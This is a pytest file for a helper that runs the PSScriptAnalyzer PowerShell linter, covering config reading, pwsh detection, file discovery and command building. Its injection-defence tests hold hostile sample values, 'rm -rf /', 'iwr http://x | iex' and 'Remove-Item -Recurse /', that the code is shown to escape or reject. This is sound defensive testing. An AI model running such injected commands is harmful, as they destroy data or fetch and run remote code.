"""Behaviour tests for makescripts._psscriptanalyzer: config reading, pwsh detection, file discovery, and orchestration."""

# pyright: reportPrivateUsage=false

from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from bmk.adapters.stagerunner.helpers._psscriptanalyzer import (
    _exclude_rule_fragment,
    _ps_single_quote,
    check_pwsh,
    ensure_psscriptanalyzer,
    find_ps1_files,
    get_excluded_rules,
    main,
    run_psscriptanalyzer,
)
from bmk.adapters.stagerunner.helpers._toml_config import PSScriptAnalyzerConfig

# ---------------------------------------------------------------------------
# get_excluded_rules
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_get_excluded_rules_returns_fallback_when_no_pyproject(tmp_path: Path) -> None:
    """Falls back to built-in rules when pyproject.toml is absent."""
    rules = get_excluded_rules(tmp_path / "nonexistent.toml")

    assert isinstance(rules, tuple)
    assert len(rules) > 0
    assert "PSAvoidUsingWriteHost" in rules


@pytest.mark.os_agnostic
def test_get_excluded_rules_returns_fallback_when_no_section(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """Falls back to built-in rules and warns when [tool.psscriptanalyzer] is absent."""
    pyproject = tmp_path / "pyproject.toml"
    pyproject.write_text("[project]\nname = 'test'\n")

    rules = get_excluded_rules(pyproject)

    assert "PSAvoidUsingWriteHost" in rules
    captured = capsys.readouterr()
    assert "WARNING: No [tool.psscriptanalyzer] section found" in captured.err
    assert "[tool.psscriptanalyzer]" in captured.err


@pytest.mark.os_agnostic
def test_get_excluded_rules_reads_from_pyproject(tmp_path: Path) -> None:
    """Reads custom rules from [tool.psscriptanalyzer].exclude-rules."""
    pyproject = tmp_path / "pyproject.toml"
    pyproject.write_text(
        '[project]\nname = "test"\n\n[tool.psscriptanalyzer]\nexclude-rules = ["PSCustomRule", "PSAnotherRule"]\n'
    )

    rules = get_excluded_rules(pyproject)

    assert "PSCustomRule" in rules
    assert "PSAnotherRule" in rules
    assert len(rules) == 2


# ---------------------------------------------------------------------------
# check_pwsh
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_check_pwsh_returns_path_when_available() -> None:
    """Returns a path string when pwsh is on PATH and launches successfully."""
    probe_result = subprocess.CompletedProcess(args=[], returncode=0, stdout="", stderr="")
    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value="/usr/bin/pwsh"),
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=probe_result),
    ):
        result = check_pwsh()

    assert result == "/usr/bin/pwsh"


@pytest.mark.os_agnostic
def test_check_pwsh_returns_none_when_missing() -> None:
    """Returns None when pwsh is not on PATH."""
    with patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value=None):
        result = check_pwsh()

    assert result is None


@pytest.mark.os_agnostic
def test_check_pwsh_returns_none_when_probe_fails() -> None:
    """Returns None when pwsh is installed but cannot actually launch (e.g. snap-confine)."""
    probe_result = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="snap-confine error")
    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value="/snap/bin/pwsh"),
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=probe_result),
    ):
        result = check_pwsh()

    assert result is None


# ---------------------------------------------------------------------------
# find_ps1_files
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_find_ps1_files_excludes_venv(tmp_path: Path) -> None:
    """Files under .venv are excluded from results."""
    venv_dir = tmp_path / ".venv" / "scripts"
    venv_dir.mkdir(parents=True)
    (venv_dir / "activate.ps1").write_text("# venv")

    project_script = tmp_path / "src" / "scripts"
    project_script.mkdir(parents=True)
    (project_script / "build.ps1").write_text("# build")

    files = find_ps1_files(tmp_path)

    assert len(files) == 1
    assert files[0].name == "build.ps1"


@pytest.mark.os_agnostic
def test_find_ps1_files_excludes_suffixed_venv(tmp_path: Path) -> None:
    """A suffixed venv dir (.venv-win, the Windows env in the dual-OS layout) is excluded."""
    venv_dir = tmp_path / ".venv-win" / "Scripts"
    venv_dir.mkdir(parents=True)
    (venv_dir / "Activate.ps1").write_text("# win venv")

    project_script = tmp_path / "src" / "scripts"
    project_script.mkdir(parents=True)
    (project_script / "build.ps1").write_text("# build")

    files = find_ps1_files(tmp_path)

    assert len(files) == 1
    assert files[0].name == "build.ps1"


@pytest.mark.os_agnostic
def test_find_ps1_files_excludes_node_modules(tmp_path: Path) -> None:
    """Files under node_modules are excluded from results."""
    nm_dir = tmp_path / "node_modules" / "pkg"
    nm_dir.mkdir(parents=True)
    (nm_dir / "script.ps1").write_text("# npm")

    files = find_ps1_files(tmp_path)

    assert len(files) == 0


@pytest.mark.os_agnostic
def test_find_ps1_files_excludes_git(tmp_path: Path) -> None:
    """Files under .git are excluded from results."""
    git_dir = tmp_path / ".git" / "hooks"
    git_dir.mkdir(parents=True)
    (git_dir / "pre-commit.ps1").write_text("# hook")

    files = find_ps1_files(tmp_path)

    assert len(files) == 0


@pytest.mark.os_agnostic
def test_find_ps1_files_returns_empty_for_no_files(tmp_path: Path) -> None:
    """Returns empty list when no .ps1 files exist."""
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.py").write_text("# python")

    files = find_ps1_files(tmp_path)

    assert files == []


@pytest.mark.os_agnostic
def test_find_ps1_files_returns_sorted(tmp_path: Path) -> None:
    """Results are sorted by path."""
    (tmp_path / "z_script.ps1").write_text("# z")
    (tmp_path / "a_script.ps1").write_text("# a")
    (tmp_path / "m_script.ps1").write_text("# m")

    files = find_ps1_files(tmp_path)

    assert len(files) == 3
    assert files[0].name == "a_script.ps1"
    assert files[1].name == "m_script.ps1"
    assert files[2].name == "z_script.ps1"


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------


def _make_completed(returncode: int, *, stdout: str = "", stderr: str = "") -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess([], returncode=returncode, stdout=stdout, stderr=stderr)


# ---------------------------------------------------------------------------
# ensure_psscriptanalyzer
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_ensure_psscriptanalyzer_skips_install_when_present() -> None:
    """Does not install when PSScriptAnalyzer is already available."""
    with patch(
        "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run",
        return_value=_make_completed(0, stdout="PSScriptAnalyzer  1.22.0\n"),
    ) as mock_run:
        ensure_psscriptanalyzer("/usr/bin/pwsh")

    mock_run.assert_called_once()
    assert "Get-Module" in mock_run.call_args[0][0][3]


@pytest.mark.os_agnostic
def test_ensure_psscriptanalyzer_installs_when_missing() -> None:
    """Installs module when PSScriptAnalyzer is not found."""
    with patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run") as mock_run:
        mock_run.side_effect = [
            _make_completed(0, stdout=""),
            _make_completed(0),
        ]
        ensure_psscriptanalyzer("/usr/bin/pwsh")

    assert mock_run.call_count == 2
    install_cmd = mock_run.call_args_list[1][0][0]
    assert "Install-Module" in install_cmd[3]


# ---------------------------------------------------------------------------
# run_psscriptanalyzer
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_run_psscriptanalyzer_returns_zero_on_clean(tmp_path: Path) -> None:
    """Returns 0 when PSScriptAnalyzer reports no violations."""
    with patch(
        "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)
    ) as mock_run:
        result = run_psscriptanalyzer(
            pwsh="/usr/bin/pwsh",
            files=[tmp_path / "script.ps1"],
            exclude_rules=("PSAvoidUsingWriteHost",),
        )

    assert result == 0
    cmd = mock_run.call_args[0][0]
    assert cmd[0] == "/usr/bin/pwsh"
    assert "Invoke-ScriptAnalyzer" in cmd[3]
    assert "PSAvoidUsingWriteHost" in cmd[3]


@pytest.mark.os_agnostic
def test_run_psscriptanalyzer_returns_nonzero_on_violations(tmp_path: Path) -> None:
    """Returns non-zero when PSScriptAnalyzer finds violations."""
    with patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(3)):
        result = run_psscriptanalyzer(
            pwsh="/usr/bin/pwsh",
            files=[tmp_path / "script.ps1"],
            exclude_rules=(),
        )

    assert result == 3


@pytest.mark.os_agnostic
def test_run_psscriptanalyzer_verbose_prints_command(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """Verbose mode prints the command being run."""
    with patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)):
        run_psscriptanalyzer(
            pwsh="/usr/bin/pwsh",
            files=[tmp_path / "script.ps1"],
            exclude_rules=("PSAvoidUsingWriteHost",),
            verbose=True,
        )

    assert "Running:" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# command-injection defences (a hostile pyproject.toml must not run PowerShell)
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_ps_single_quote_doubles_embedded_quotes() -> None:
    """A single quote is escaped by doubling, the only escape in a PS single-quoted string."""
    assert _ps_single_quote("plain") == "'plain'"
    assert _ps_single_quote("o'brien") == "'o''brien'"
    assert _ps_single_quote("a'; rm -rf /; '") == "'a''; rm -rf /; '''"


@pytest.mark.os_agnostic
def test_exclude_rule_fragment_quotes_each_element_or_omits_when_empty() -> None:
    """Rules become a quoted PS array; no rules means no -ExcludeRule flag at all."""
    assert _exclude_rule_fragment(()) == ""
    assert _exclude_rule_fragment(("PSAvoidUsingWriteHost",)) == " -ExcludeRule 'PSAvoidUsingWriteHost'"
    assert _exclude_rule_fragment(("PSFoo", "PSBar")) == " -ExcludeRule 'PSFoo','PSBar'"


@pytest.mark.os_agnostic
def test_run_psscriptanalyzer_escapes_a_file_path_with_a_quote(tmp_path: Path) -> None:
    """A path containing a single quote is escaped, not left to break out of the array."""
    nasty = tmp_path / "o'brien" / "script.ps1"
    with patch(
        "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)
    ) as mock_run:
        run_psscriptanalyzer(pwsh="/usr/bin/pwsh", files=[nasty], exclude_rules=("PSAvoidUsingWriteHost",))
    command = mock_run.call_args[0][0][3]
    assert _ps_single_quote(str(nasty)) in command
    assert "o''brien" in command  # the quote was doubled, not left raw


@pytest.mark.os_agnostic
def test_psscriptanalyzer_config_drops_non_rule_id_entries() -> None:
    """The config boundary keeps only ^PS[A-Za-z0-9]+$ ids, dropping injection attempts."""
    config = PSScriptAnalyzerConfig.model_validate(
        {"exclude-rules": ["PSAvoidUsingWriteHost", "Evil; iwr http://x | iex; #", "PS With Space", "PSUseBOM"]}
    )
    assert config.exclude_rules == ("PSAvoidUsingWriteHost", "PSUseBOM")


@pytest.mark.os_agnostic
def test_get_excluded_rules_strips_injection_from_pyproject(tmp_path: Path) -> None:
    """A malicious exclude-rules entry never reaches the pwsh command; valid ids survive."""
    (tmp_path / "pyproject.toml").write_text(
        '[tool.psscriptanalyzer]\nexclude-rules = ["PSAvoidUsingWriteHost", "X; Remove-Item -Recurse /"]\n',
        encoding="utf-8",
    )
    assert get_excluded_rules(tmp_path / "pyproject.toml") == ("PSAvoidUsingWriteHost",)


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------


@pytest.mark.os_agnostic
def test_main_returns_zero_when_pwsh_not_found(capsys: pytest.CaptureFixture[str]) -> None:
    """Returns 0 and prints skip message when pwsh is absent."""
    with patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value=None):
        result = main(project_dir=Path("/nonexistent"))

    assert result == 0
    assert "pwsh not found" in capsys.readouterr().out


@pytest.mark.os_agnostic
def test_main_returns_zero_when_no_ps1_files(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """Returns 0 and prints skip message when no .ps1 files exist."""
    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value="/usr/bin/pwsh"),
        patch(
            "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run",
            return_value=_make_completed(0, stdout="PSScriptAnalyzer  1.22.0\n"),
        ),
    ):
        result = main(project_dir=tmp_path)

    assert result == 0
    assert "No .ps1 files found" in capsys.readouterr().out


@pytest.mark.os_agnostic
def test_main_returns_zero_when_lint_passes(tmp_path: Path) -> None:
    """Returns 0 when PSScriptAnalyzer finds no violations."""
    (tmp_path / "script.ps1").write_text("Write-Output 'hello'\n")
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "test"\n\n[tool.psscriptanalyzer]\nexclude-rules = ["PSAvoidUsingWriteHost"]\n'
    )

    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value="/usr/bin/pwsh"),
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run") as mock_run,
    ):
        mock_run.side_effect = [
            _make_completed(0),  # check_pwsh launch probe
            _make_completed(0, stdout="PSScriptAnalyzer  1.22.0\n"),
            _make_completed(0),
        ]
        result = main(project_dir=tmp_path)

    assert result == 0


@pytest.mark.os_agnostic
def test_main_returns_nonzero_when_lint_fails(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """Returns non-zero and prints error when PSScriptAnalyzer finds violations."""
    (tmp_path / "script.ps1").write_text("Write-Output 'hello'\n")
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "test"\n\n[tool.psscriptanalyzer]\nexclude-rules = ["PSAvoidUsingWriteHost"]\n'
    )

    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.shutil.which", return_value="/usr/bin/pwsh"),
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run") as mock_run,
    ):
        mock_run.side_effect = [
            _make_completed(0),  # check_pwsh launch probe
            _make_completed(0, stdout="PSScriptAnalyzer  1.22.0\n"),
            _make_completed(2),
        ]
        result = main(project_dir=tmp_path)

    assert result == 2
    assert "PSScriptAnalyzer found lint violations" in capsys.readouterr().err


# ---------------------------------------------------------------------------
# discovery must reach the scan (the exclusions are not decorative)
# ---------------------------------------------------------------------------


def _pwsh_command(mock_run: object) -> str:
    """The -Command string handed to pwsh by the last subprocess.run call."""
    return mock_run.call_args[0][0][3]  # type: ignore[attr-defined]


@pytest.mark.os_agnostic
def test_main_does_not_lint_ps1_files_inside_a_venv(tmp_path: Path) -> None:
    """A vendored .ps1 under .venv must never reach PSScriptAnalyzer.

    find_ps1_files excluded it, but the scan used to be handed the project ROOT with
    -Recurse, so it re-walked the tree and linted the venv anyway. Discovery was then only
    a "run at all?" gate: one real script opened it and the vendored npm wrappers that ship
    inside pyright[nodejs] got flagged. CI never caught it - CI builds its venv outside the
    repo, so nothing vendored was ever in range.
    """
    (tmp_path / "real.ps1").write_text("Write-Output 'hi'", encoding="utf-8")
    vendored = tmp_path / ".venv" / "Scripts"
    vendored.mkdir(parents=True)
    (vendored / "npm.ps1").write_text("Write-Output 'vendored'", encoding="utf-8")

    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.check_pwsh", return_value="/usr/bin/pwsh"),
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.ensure_psscriptanalyzer"),
        patch(
            "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)
        ) as mock_run,
    ):
        main(project_dir=tmp_path)

    command = _pwsh_command(mock_run)
    assert "npm.ps1" not in command, "a .ps1 inside .venv was handed to the scanner"
    assert "real.ps1" in command, "the project's own script must still be linted"
    assert "-Recurse" not in command, "-Recurse re-expands the tree and undoes the exclusions"


@pytest.mark.os_agnostic
def test_main_scans_every_discovered_file(tmp_path: Path) -> None:
    """All discovered scripts reach the scan, not just the first."""
    for name in ("a.ps1", "b.ps1"):
        (tmp_path / name).write_text("Write-Output 'x'", encoding="utf-8")
    nested = tmp_path / "tools"
    nested.mkdir()
    (nested / "c.ps1").write_text("Write-Output 'x'", encoding="utf-8")

    with (
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.check_pwsh", return_value="/usr/bin/pwsh"),
        patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.ensure_psscriptanalyzer"),
        patch(
            "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)
        ) as mock_run,
    ):
        main(project_dir=tmp_path)

    command = _pwsh_command(mock_run)
    for name in ("a.ps1", "b.ps1", "c.ps1"):
        assert name in command


@pytest.mark.os_agnostic
def test_run_psscriptanalyzer_skips_pwsh_entirely_when_no_files() -> None:
    """An empty file list must not spawn pwsh at all."""
    with patch("bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run") as mock_run:
        result = run_psscriptanalyzer(pwsh="/usr/bin/pwsh", files=[], exclude_rules=())

    assert result == 0
    mock_run.assert_not_called()


@pytest.mark.os_agnostic
def test_violation_count_is_capped_so_it_cannot_wrap_to_success(tmp_path: Path) -> None:
    """The exit status is capped at 255: a POSIX status is mod 256, so 256 would read as 0."""
    with patch(
        "bmk.adapters.stagerunner.helpers._psscriptanalyzer.subprocess.run", return_value=_make_completed(0)
    ) as mock_run:
        run_psscriptanalyzer(pwsh="/usr/bin/pwsh", files=[tmp_path / "s.ps1"], exclude_rules=())

    assert "if ($n -gt 255) { exit 255 }" in _pwsh_command(mock_run)
